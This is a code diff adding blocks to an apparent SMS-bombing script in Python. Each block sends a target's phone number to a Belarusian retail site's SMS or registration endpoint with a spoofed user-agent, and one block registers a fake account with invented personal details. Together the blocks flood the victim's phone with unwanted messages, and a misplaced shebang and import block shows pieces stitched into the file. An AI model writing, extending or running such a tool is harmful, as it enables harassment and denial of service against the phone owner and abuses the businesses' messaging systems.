@@ -150,3 +150,47 @@ if response.status_code == 200:
     print("Смс от emall отправлено!")
 else:
     print("Смс от emall не отправлено!")
+
+
+user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
+headers1 = {
+    "user-agent": user
+    }
+
+response = requests.post('https://sosedi.by/local/api/smsSend.php', json={"phone":f"{phone}"}, headers=headers1)
+if response.status_code == 200:
+    print("Смс от sosedi отправлено!")
+else:
+    print("Смс от sosedi не отправлено!")
+    
+    
+user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
+headers1 = {
+    "user-agent": user
+    }
+
+response = requests.post('https://adel.newkontinent.by/api/acnewkontinent/check_client/', json={"phone":{"strana":"375","number":f"{phone[4:]}"}}, headers=headers1)
+if response.status_code == 200:
+    print("Смс от newkontinent отправлено!")
+else:
+    print("Смс от newkontinent не отправлено!")
+
+
+user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
+headers1 = {
+    "user-agent": user
+    }
+
+#!/usr/bin/python
+# -*- coding: utf8 -*-
+import os, sys
+#import fake_useragent
+import requests
+#import time
+
+
+response = requests.post('https://evropochta.by/rest/Json?What=DiscountClub.PutManDiscountShort', json={"CRC":"","Packet":{"MethodName":"DiscountClub.PutManDiscountShort","JWT":"null","ServiceNumber":"E811AE79-DFDE-4F85-8715-DD3A8308707E","Data":{"SourceName":"evropochta.by","LoginNameTypeId":"2","TargetId":"36,37,38","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"12","Porch":"1","Floorx":"4","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Name2":"Иван","Name1":"Иванович","Name3":"Иванов","Phone1":f"{phone[1:]}","Address3Name":"1","Address4Id":"227177","city":"80907","Address5Id":"80907","Address5Name":"Минск","Password":"123321123Eg","passwordRepeat":"123321123Eg"}}}, headers=headers1)
+if response.status_code == 200:
+    print("Смс от evropochta отправлено!")
+else:
+    print("Смс от evropochta не отправлено!")
